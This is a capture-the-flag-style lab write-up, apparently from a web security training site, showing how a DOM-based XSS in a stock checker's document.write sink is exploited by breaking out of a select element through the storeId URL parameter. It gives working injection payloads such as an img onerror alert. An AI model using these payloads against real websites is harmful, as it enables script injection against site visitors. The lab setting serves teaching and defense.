# Lab: DOM XSS in document.write sink using source location.search inside a select element

 This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 


# Step 1 Locate a location to test for DOM XSS on webapp

I find the document.write function for checking the stock of a product

![image](https://user-images.githubusercontent.com/83407557/211238756-70f19ee8-891f-4dd0-8791-f41fa09692be.png)

# Step 2 Use the source luke

Looking at the javascript:

```javascript

                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
```

I am going want to break out of this select element using the StoreId source:

```javascript
document.write('<select name="storeId">');
```

So if I use the following:

```javascript
&storeId=BAD STUFF HERE
```
and add it onto the request for a product:

```
/product?productId=1&storeId=BAD STUFF HERE
```

I can see that "BAD STUFF HERE" is now one of the store options:

![image](https://user-images.githubusercontent.com/83407557/211239805-5d65e27c-70b8-47eb-8531-9af60f802915.png)

# Step 3 Break out of select element

Now that I can hijack the document.write sink, I still need to break out of the select element

```html
script
<select name="storeId">

breaking out
  "></select>BREAK OUT
```
So the new url would be

```
/product?productId=1&storeId="></select>BREAK OUT
```

![image](https://user-images.githubusercontent.com/83407557/211240727-c6b2e24c-cfd1-47c0-9d00-aa26a10c7362.png)

# Step 4 Use XSS once broken out

Now I know that this is how I am meant to solve this lab with a payload like:

```
/product?productId=1&storeId="></select><img src onerror=alert(1)>
```

Which I will show:

![image](https://user-images.githubusercontent.com/83407557/211241007-cb2aed49-0b75-4e86-ac96-72b6d6ceff3e.png)

![image](https://user-images.githubusercontent.com/83407557/211241039-9f19ebff-daac-4d1c-802e-037e701f56ff.png)

# Alternative

However, it is not required to close the select element to get XSS to fire off, and alternate payload could be something like 

```
/product?productId=1&storeId="><img src onerror=alert(2)>
```

![image](https://user-images.githubusercontent.com/83407557/211241288-4f2213f0-85fa-4e74-9870-3cdcf6f42f43.png)

And you can see why just looking at the elements in dev tools:

![image](https://user-images.githubusercontent.com/83407557/211241413-29d5b365-d9d0-47c1-89bb-359069944350.png)

Furthermore the "> isn't required either as just setting the storeId as a basic XSS payload with script tags will also work:

![image](https://user-images.githubusercontent.com/83407557/211241596-ca13f2ee-f5e4-4a97-ba32-19e7f2581dd6.png)

For the same reason:

![image](https://user-images.githubusercontent.com/83407557/211241621-80e8dae8-494c-4fd1-af90-7d1aec68bdf6.png)

Another option for searching for this would have been to use a canary from DOM invader, once the StoreId source was initially found:

![image](https://user-images.githubusercontent.com/83407557/211241811-b8c10709-8728-42c2-921e-234575373f55.png)
